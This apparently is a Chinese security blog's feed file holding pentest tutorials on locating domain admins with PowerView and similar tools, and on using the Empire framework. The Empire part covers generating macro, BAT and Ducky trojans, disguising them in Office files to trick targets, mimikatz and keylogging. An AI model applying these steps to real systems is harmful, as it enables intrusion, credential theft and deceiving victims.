0c5d211309c37262df504706c0a1cf5dab129f97653d0f11318977231077a0aa1637e195bf168719f53d500a7d008c55f317b9d90968c4a654bb2c45df079084cdf9cb69766551effebba06f28da0d8100e132dd76de58ed38f9c7c8bfe940209f400ce80c7dcd0fa642d537dca2a9cbf7c0230e56318cbcab91afaf0b30dec81f0298ad29debffd4ca711fca95fdebe3e7c044dfbcf4b1cbae613f04ef1edced4f28bafa037351b9202f17d5ea96c4f9b564a77706ba03ea90ba1b31dc01ad9ee488bc07e20a24b27c492e0e14634c39da94823b5ee686749dca556d6e6d8e2aa1b4c901aea70f9803572ba95412a6d8048fadd9d81db113c0c4a394581604cb0dcb8c1ecff2ef08578969f5b5d94103e74f4cb330c379472da73cb6425751571c8a1ad447b54ecf2e495e79236415ef4f597fbd8abdfb4f93a26f0f483647756e447e4c85cd3d4ceb8118a5a45584c44bb789e41058629377ba5260b2a9e3f1e56f356d35398dfb050add2c1e874d55ad54ae69c66369d616f34ced82e224aea62bf7f0e076168506404af58a116166487f1260828db7fdb2d917689c8ee2f4afea75b3537c3fbb319a289cfc3b073ad60a6a71eabdb8f18a1ae84dc685011706d684a8f6f9a551b7a9ab4848a35a22c1a267d87207e4ec8aa09a657b3e04eae19c6e08a10d6ad157269185e41695091dafe4b2a4a5e0a86c560853752eda74be9f14b911e0efa51dbae46078a71e07715f72e782d97c3cfd714b83a9ca23b465a5c08851a08446c23c1e3f28700d2702c7d9f11a4b3975586dba3e291dd048740de2c84f2b4955569322d903e5482a03855265ece9e043ce51cb6f0eecc0fb8f0fb635d397eefb0079cf02f1ee87aafc4acf51f4e86225463a464811b1fb71f5f030899d5c9a196ddfba542125a0adfdd727ccdb919a605fe21083a130b22ff9bdb8065fd921140e29852444b4341b95bfcae9e74c4ba03b00d7418ab9c7dfa48f587a0f4080f517de928f3eb8382d11e1fc3a110f065e1f2145654eee3e8fcbd179e389134052a378803402a8fa8f1abe6ca9cbbf75ab1078959d183fca824fe65946263d86b6197756872e7942e70a3b4ed01de67bfd117e1a1aa5b602691ec15e50317f8b6143009cdf07195097b88bade1c891c29894fff2e2da07fd3a421251f9d8b60d33aa9d58e9654606a99f4e0043096b3b4c8beb87dbf56b3d0c5916a9d3d1aed06cc4f83b280b178a0f6fa3bbcba2aea864cc6faee454cecbe67eb5f6086f62c379184fcb70a9e63fa7ffc7ab7333744c453f98615c8aa04a57a0a1947e75de5021adaa91e35e8932a85c1befb205447b995af012b551fd1ccecf006243a14adf1cf5ae0f7402ab57446ef3900d8ab71c494390fa0f08a3b578f368a702abefcf480338bd71f3112e69b46a093baa6044b41ec38d0eaff08347d219f746591c632eea6babf596403c88f6b58127032c0a094878eda139d07e8b5594c1361f4b60c13ef79256479f8705280605e2035b721cb2b6c6aa7703aaa3e486a648ce92a417ef5ab21c9657db75408f83d5f135f955dc124e6985b240554a0d79bd7878c233f40b4aef93d38092eb59119ac3b37decf67d191854a45449414ddc1807c7897c582b00cfa9c9f9f70f654c4462c7066a7e8766f16532bfe944fd78cbe774a4dbb31f37a2e969e51fc58abbdb288a33f14588022019411a448c2c0610e7d75117ff143b007d101c4ac29fef82e2670cfab4477f0336081e98f5eedb0421dc6fd65644d3c21323d42cc15e3bc2782c85d418c8f22e4345a0cb2ce1e5953ae194c24bca5039274e3d5d22c8c82364f4b429406dac6537f26c101ec0b6bbeb20b903f2c40fd30ec0f2686910bda754a82d41f6e93ebbc8b66187b9b1d89de45fa0da3fd09466636d2c14ae452e8326c7eda37e2f656ac0f82e5e381079615927113531960b01b46f255db1629ea6404393186223361853e448721c3902f0e62936e662a96ae5fa232a93d7ff95bb28ba9c89c9ab3668613d0921e8d1e78eccf44c5caafb3fa511fc00bf9a82fcd96a1b3570d7b7f7f8c21838d5531e3955c2e7a10a5e92db3fa229a6ff545a2e3cb47f254e076992b6abdd5035c02240f892707941e60739ac20dfc7054daba22a066c9d73af3722736e4dbfc1cf0d0f12e4f5647e326b735885dcd71537e4cd3bb171df84c2c322c2391ddcc6ffaa67b6c1d6238c5714de59470fcf368a2a712afe973dd4c026bdcdea8b95fec4479ae14b6cdbb42fbbe961865f9e43e9b154d6f954f3d1439946bf29bbefeeca02f8c2f1a2178875fe19cb2542712a30491ddf5d0cf6c1cb88cd2a2a7a4bf3334b183c2ed029d32746258f8e2c589ff7a05daa7b7b02a8ed8e7369df0b67db06d5ef6be63eec56d6329bb620c1580768dae5797ae73d6429fe8cf62313f1229b0b3c465f34dd70a0565226e18c1d9478f201363b5087af54844075fd97441912a81e9e7819c09810f7b57765dc0376b9850c8a42f6b11136cc00e1b5e31a277039a07c55facd8e0a859b5e64591b66e187a9b48bd12f3d0d62d4b76de42c9c2dc948f40d8df9d3df944c50c9787f1654cfd4a85a62dfd0daa5cf0a67bd5c64af3d388bb4bb5cc676d2081ecd7ac260cd26ebf7a520afd80721398815577994208d06415e2fee1717b4e15573b403a26a69df9321b10d9f0d0f9ffc88d11da0fee0d2eb7e6c35edcca7a9578652df843eb5cb770ddbd7d6ab37a66e17fe3d5dfac59f23027bdaec51964c4f3e71a0da461da046d5b90f71eedd33aaa57492489aede32e931587948ba19159c4b00b43a3e51e5abcac1a6ffcd606ade4ceab9527e4ae4529b20f1a9e8954ce1ad0d064d27b13df41735b1b9c3d69c5a1abce08ac7c1b3937096f427cfab1d1f84ddc785a3bfe15160177a903921a277e35acac35132dfa16cd198b1288b89f637381e2f12e6821b9be0a02a8a8a9ed626f02d71b021d9eb90e9b320ba9777508710d8c1553a41db7ab7c239b60c4a4f312a451119338400e1ec48b0ea623720aa112aca6caf29316cdb4861e704b6a2a433f70350ecdce1ffeba9feaef5b3ec8b81ac15ae262d8715c0da18b32318d55f7d773fcb87142e78550577dfe6a673f27b5f0163c4f42f18cc6761762b10bded1da4639470efe3512efb7cd2f3b58ad0de4b7b10ffeac689ec23b64a5528cce8442c47e2a13857791b8c8626053f7adfb7cd69c48d8b33763811750cf21eed06621b2ca6e568c9d25b9976aedf45e880137aaca8893ca4fcae68d3ea0b7f5047658c4ffa6173e25190a3c39060f9837d5e131b45db8d974b0e2b34084d57ff71db1a63ce525aad5114bbc2468ccb8af319a1190810f73ca8de970e6dc18a5515188b561cb4884681ed0a4762c2f2c459992e6e962df2629c5e45a12d58017ab26db8417861009a5030fdbdc0d1a401b33a3213cc25087409d7a7849fff199391e8dcade0176a6b5f91b705db9317febb196b1bfb501923526dea46aae92a7ae9ce5f580d038b537c9f1eb873004cfa704c5f31ae0bc5df9584048795bf135f7781b90299c325e34f8b7ab0f8529cf7a80b3aff7093aafcd330672d2ad06ed6c01ccf4f573ba58caa9a65a6366b4e9099157a1925a479625f03cd482b61c467ac61722a7cdf073ed9833edbf6ec316fa0e9913ada37e0a6230ba2100fc3ea16b7d078e1b195bab9758a3d6ebfd6e7659456e850119d6ccde4dd7d79a62f356f2b5da82a7f21aa2bf6dd85e1b913d2cfd328a009881097ee1ffc9b792b40f4813d6017d11597b76a6afa902451b6c2525db2b4f1128c1c18270de3d8e179c8cb77d63ca57eb3bf88c29de74d5023273d24c2c012d50a7880ae3635e1cc5368aa731e2cdcd1047bcc409c039e7a57b93d490fb5b3f033c459e62965127f05f3306bc0d466ef4af626874082d898f14815e00c1ba431c2d1285ce925ad40c74fd501512b1a4ec6c89a32050c0f91b8c7164e505a81a4c3b6a339f7d80f580e4e9611ad1e1de2fa4504865c14e3557ff3d881fd6c31702333a3894a937a4c6f82b0e0992ccc5ad063ed5fd378edaff6b4efad30478091f7a5f98fa9ead269301d563d49810277d65b3590f05a7a7a6eb10f49009488f3f52f1aad088db7a4c50f30ccfef606edeca75a59ae09fa7c1b5f776feb7d299bb14cc37a024143a3dc11e8a85e3cb93e8439069b3f2800d51d47b2db4b20abae4c603ca5fb29fe38697d681ea2afbd604a35fdb6656cd94c31f21402f414526f8c306a7aa1a77df4ac72e8ee15bdc5a0b993dc396a778535b3f7ff0d612224aca081667548b3d0a1d8665ef202ad0ebb992358b85cfc018dc7db13f37ad61d5e6fe36e0b5d874f67a4a9510e02a827707ab933021ed29366baf0fe3cddf6b3f079d7649b8530dd5220d84bb155958666a89e399ef54ea4bef95ea8ed702471e0b3f48b6b021cdfea10236baa63a055d77e531d86a237cb4bb3c24232b9177343dbcc1a8df506bf2f4a19b7a69b975f17f826080c23fcd7b9e7285341101c97e53a38eaf837c5b800777c81a348fbc1681189d0f2433235a481c5628453cdd044ed31dd8687e309c62ef7330363003ea00ad431abc05dd773f84f379b78aacee61066e33a0727e43ddc82abc7b8a894b5d7339d5c2acef6ceaa886ae6f48dea20974d3f599bbcf31e9d61bcc8b69aa9d26f5fcd714487e9d5f2f68d0a9be584cc72c289d2be40480f9e95d8c7ab577ff07bf74b94165998ee9a3b681d462178fb7a7c54dbae7ef76497598869d6664f1f78515fea0d4d68a9e491fcd038685f813601c58f3bbedeb1218a6586e5eea5987a17a8027890b7a21f0228c0e7bb7efab3a0909509b3c197aa3b20f8e997b9887e0aca7a0587dfc0297d06c75c0a030679a044a290dcfd08075141f351f8a741155c011e425b945cb1045e49d9c740b2ed96ec28d9c0887ef48db14d0c39b5e3d5af7225ee5bc562bbd464ed427263a3183a2a8330089e142eaa0fc01dddb033f5b82c174b1b3a154f5c05ee4026c21de143280eae2950ec6d27512ca566fe380e3e6f0583f4c527293dae408b4f361e91fc133af5bc0d08b6f8028c1ff519a04561f8d72696465dc35ca0e911e1479ec7ce98a52135ee24709c9954810d7d2d38481fe631c454462c9880b67ed4d49619b91821d7a7659e44f1d83cc676c061ddaf39c1a9ca5327447e13bcf78ae86e8849537eb1368f13ff3bf732441ca5b7e94e104255b06ae160fe569b3e591d4503634f8ae332302db100c56879404d149c3e359f63711d1a145332f1acd3c59f8c87e1118a050cd2f892134f261b0cda90fd3c74d777a93b9c260de01598b3f18932d1bdcb6b0b988cb3ad67c195550883b3fb00c25080e5d4a88f0a3392f981209e327e93bf4044f3bb674275e437f2214095b0ac60441b3c85edde39103c6179db30809e7677d0d008413a8906d844db595a225093f4ae208d340b2af4f81281531ca80dd786c2a3000bdce94e14ed33fa144a8edc2a7d818c91f6a3d6fe2fcd13298ae53f6259e8434b8fb2412052e8fedc1f39</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定位域管理员</title>
    <link href="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <url>/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
    
    <content type="html"><![CDATA[<p>内网渗透与常规的渗透测试是截然不同 的。内网渗透测试的需求是，获取内网中特定用户或机器的权限，进而获得特定的资源，对内网的安全性进行评估。</p><h2 id="域管理定位概述"><a href="#域管理定位概述" class="headerlink" title="域管理定位概述"></a>域管理定位概述</h2><p>  在内网中，通常会部署大量的网络安全系统和设备，列入IDS,IPS,日志审计，安全网关，反病毒软件等。在域网络攻击测试中，获取域管理员权限。<br>      在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，具备完全控制权限。<br>    定位域内管理员的常规渠道，一是日志，而是会话。日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。会话是指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具查询(可以匿名查询，不需要权限)</p><h2 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h2><p>常用的域管理员定位工具有psloggedon.exe,PVEFindADUser.exe,netsess.exe,以及hunter,NetView等，在powershell中，常用的工具是PowerView。<br><strong>1.Psloggedon.exe</strong><br>在windows平台上，可以执行命令”net session”来查看谁使用了本机资源，但是没有命令可以用来查看谁在使用远程计算机资源，谁登录了本地或远程计算机。<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表HKEY_USERS项的key值来查询谁登录过，但某些功能需要管理员权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psloggedon [-] [-x] [-l] [\\computername| username]<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210429233354452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-l：仅显示本地登录，不显示本地和网络资源登录。</li><li>-x: 不显示登录时间。</li><li>\computername  指定要列出登录信息的计算机的名称。</li><li>username: 指定用户名，在网络中搜索该用户登录的计算机。</li></ul><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><p>2.<strong>PVEFindADUser.exe</strong><br>PVEFindADUser.exe可用于查找活动目录用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework2.0环境，并且需要具有管理员权限。<br><img src="https://img-blog.csdnimg.cn/20210430131109497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我的没连接成功，不知道为什么，希望有大佬告诉我。</p><ul><li>-u:检查程序是否有新版本</li><li>-current [‘username’]:如果仅指定-current参数，将获取目标计算机上当前登录的所有用户。如果指定用户名(Domain\Username),则显示该用户登录的计算机。</li><li>last[“username”]:如果仅指定了 -last参数，将获取目标计算机的最后一个登录用户，如果指定了用户名(Domain\username），则显示此用户上次登录的计算机。根据网络的安全策略。可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到该用户名。</li><li>noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行Ping命令。</li><li>target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机，如果指定此参数，则后跟一个由逗号分隔的主机名列表。</li></ul><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a><br><strong>3.netview.exe</strong><br> netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。<br><img src="https://img-blog.csdnimg.cn/20210430134829728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-f filename.txt:指定从中提取主机列表的文件。</li><li>-e filename.txt:指定要排除的主机名文件。</li><li>-o filename.txt:将所有输出重定向到文件。</li><li>-d domain:指定从中提取主机列表的域。如果没有指定，则使用当前域。</li><li>-g group:指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</li><li>-c:检查对已找到共享的访问权限。</li></ul><p>下载地址：<a href="https://malicious.link/projects/netview.exe">https://malicious.link/projects/netview.exe</a></p><p><strong>4.PowerView脚本</strong><br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span>  bypass -Command <span class="hljs-string">&quot;&amp; (Import-Module .\PowerView.ps1; Invoke-StealthUserHunter)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430142150756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Invoke-StealthUserHunter ：只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSession获取。因此不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)。PowerView默认使用Invoke-SteathUserHunter,如果找不到需要的信息，就使用Invoke-UserHunter。</li><li>Invoke-UserHunter :找到域内特定的用户群，接收用户名，用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnum API)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</li></ul><p>下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><p><strong>5.Empire中的user_hunter模块</strong><br> 在 Empire 下user_hunter模块用来查找域管理员登录的机器的。<br>获取反弹shell<br>使用命令<br>usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter<br>我机器出问题了就不演示这个了</p><p>参考：<a href="https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/">https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>定位域管理员</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire使用</title>
    <link href="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于Powershell的远程控制木马。</p><p>全部功能参照：<a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>git  clone <a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><p>接着</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> Empire<br><span class="hljs-built_in">cd</span> setup<br>sudo ./install.sh<br>./empire          <span class="hljs-comment">#即可打开</span><br></code></pre></td></tr></table></figure><p>和metasploit使用原理都是一样的，都是先设置一个监听，接着生成木马，然后在目标主机中运行该木马，我们的监听就会连接上返弹回来的代理</p><h4 id="建立监听："><a href="#建立监听：" class="headerlink" title="建立监听："></a>建立监听：</h4><p>输入Listeners   进入监听线程界面    可以输入help查看帮助</p><p>接着输入uselistener来设置采用何种模式，通过双击tab键可以看到一共有7中模式：</p><p>dbx,http,http_com,http_foreign,http_hop,http_mapi,meterpreter</p><p>使用http监听模式：</p><p>uselistener  http</p><p>然后输入     info       查看具体参数</p><p>通过set命令设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Name  shuteer<br><span class="hljs-built_in">set</span> Host XX.XX.XXX.XX:XXX (Empir所在服务器IP)<br><br>HOST是我们VPN的IP，所以就不做修改了，修改完后可以再次输入info，查看设置是否正确<br>然后输入execute即可监听<br></code></pre></td></tr></table></figure><p>输入back命令即可返回上一层listeners界面</p><p>输入list命令可以列出当前激活的listener</p><p>使用kill命令就能删除该监听</p><p>agents下：</p><p>kill all 杀死所有进程</p><p>remove all 删除所有</p><h4 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h4><p>输入usestaget来设置采用何种模块，同样双击tab键，可以看到共26个模块。</p><p>其中multi为通用模块，osx是mac操作系统模块，剩下的就是windows的模块。</p><ul><li><p>DLL木马</p><p>想要设置dll木马，首先输入    usestager  windows&#x2F;dll</p><p>然后输入info命令查看详细参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Listener shuteer<br>execute     <span class="hljs-comment">#生成木马</span><br>就会在tmp目录下生成名为launcher.dll木马<br></code></pre></td></tr></table></figure></li><li><p>launcher</p><p>如果只需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher    &lt;language&gt;&lt;listerName&gt;<br></code></pre></td></tr></table></figure><p>将很快生成一行base64编码代码，这里输入back命令回到listener下</p><p>然后输入launcher powershellshuteer(当前设置的listener名字)命令来生成一个payload.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">launcher  powershell <span class="hljs-keyword">shuteer </span>    <span class="hljs-comment">#生成powershell代码</span><br></code></pre></td></tr></table></figure></li><li><p>launcher_vbs木马</p><p>输入usestager windows&#x2F;launcher_vbs</p><p>输入info   查看设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute                  <span class="hljs-comment">#生成的文件在tmp目录下</span><br></code></pre></td></tr></table></figure><p>最后输入back回到listener开始监听</p><p>如果要生成powershell代码，设置完listener后不输入execute，直接输入back,然后输入launcher powershll shuteer即可</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher   powershell shuteer<br></code></pre></td></tr></table></figure><ul><li><p>launcher_bat木马</p><p>usestager    windows&#x2F;launcher_bat</p><p>info</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">set listener  shuteer<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>                <br></code></pre></td></tr></table></figure><p>为了增加迷惑性，也可以将该批处理文件插入一个offic文件中，这里随便找一个word或者excel文件中，单击”插入”–&gt;”对象”–&gt;”由文件创建-“-&gt;</p></li></ul><p>“浏览”(选择刚刚生成的批处理文件，然后勾选”显示为图标”)</p><p>在”更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel，Word或者PowerPoint图标</p><p>选择完之后，点击确定，该对象就会插入到文件中</p><p>将该文件发给别人，一旦打开该文件，并运行了内嵌的批处理文件，就会得到这个主机的权限</p><p>360安全卫士会报告发现宏病毒</p><h3 id="Macro木马："><a href="#Macro木马：" class="headerlink" title="Macro木马："></a>Macro木马：</h3><p>要想设置Macro木马，首先需要输入usestager windows&#x2F;macro命令然后输入info命令插卡详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Set listener  shuteer<br>Execute<br></code></pre></td></tr></table></figure><p>默认会生成一个宏，储存在&#x2F;tmp&#x2F;macro文件中</p><p>然后需要将生成的宏添加到一个Office文档里面，这里打开一个word文件，单击‘视图’    标签，选择   ‘宏’    ，在‘宏的位置’    选择当前文件，宏名可以任意起一个，然后单击  ”创建“    按钮</p><p>单击  ”创建“  按钮以后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制进去，另存为一个新文件。</p><p>最后将这个修改果的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略。</p><h3 id="Ducky"><a href="#Ducky" class="headerlink" title="Ducky:"></a>Ducky:</h3><p>输入  usestager   windows&#x2F;ducky</p><p>然后   info   查看帮助信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute<br></code></pre></td></tr></table></figure><p>执行完就可以生成用于烧制的代码</p><p>将该代码烧制至”小黄鸭“中，插入目标用户的计算机，就可以反弹回来。</p><p><a href="https://www.freebuf.com/geek/141839.html">https://www.freebuf.com/geek/141839.html</a></p><h2 id="连接主机的基本使用："><a href="#连接主机的基本使用：" class="headerlink" title="连接主机的基本使用："></a>连接主机的基本使用：</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>1.列出以连接的主机</p><p>agents</p><p>然后使用   interact 连接主机<br><img src="https://img-blog.csdnimg.cn/2021050112572188.png" alt="在这里插入图片描述"></p><p>输入help 可以查看帮助信息</p><p>2.一些基本命令</p><ul><li><p>pwd     显示当前目录</p></li><li><p>getpid   查看当前进程<br><img src="https://img-blog.csdnimg.cn/20210501125820900.png" alt="在这里插入图片描述"></p></li><li><p>输入help agentcmds     可以看到可供使用的常用命令<br><img src="https://img-blog.csdnimg.cn/20210430173409997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>在使用部分cmd命令时，要使用”shell +命令”的格式</p></li><li><p>内置mimikatz但需要管理员权限<br>输入mimikatz<br>然后输入 creds命令可以自动过滤，整理出获取的用户密码<br><img src="https://img-blog.csdnimg.cn/20210501125901170.png" alt="在这里插入图片描述"></p></li></ul><p>导出凭证：creds export 目录&#x2F;xx</p><ul><li>在实际渗透过程中，由于种种原因，总会有部分主机丢失或失效，可以输入<br>list stale  命令列出已经丢失的反弹主机，然后输入remove stale 命令删去已经失效的主机<br><img src="https://img-blog.csdnimg.cn/20210501125925796.png" alt="在这里插入图片描述"></li></ul><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>可以使用search  module 命令搜索需要使用的模块</p><p>通过使用 usemodule collection 然后Tab查看完整的列表</p><p>1.截屏</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/screenshot<br><br>info <br><br>execute<br>back<br></code></pre></td></tr></table></figure><p>2.键盘记录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/keylogger<br>info<br>execute<br>back<br></code></pre></td></tr></table></figure><p>如果要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs即可显示当前在后台的记录</p><p>如果要停止记录输入</p><p>jobs kill  jobs_name</p><p>3.查找共享</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/share_finder<br>execute<br>back<br></code></pre></td></tr></table></figure><p>4.收集目标主机信息</p><p>该模块可以查看本机用户。域组成员，最后的密码设置时间，剪贴板内容，系统基本信息，网络适配器等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/winenum<br>execute<br></code></pre></td></tr></table></figure><p>5.列举系统信息(重点)</p><p>几乎列举了系统中的所有有用信息，如目标主机时间日志，应用程序控制策略日志，包括RDP登录信息，powershell脚本运行和保存的信息等。在运行这个脚本时需要管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule 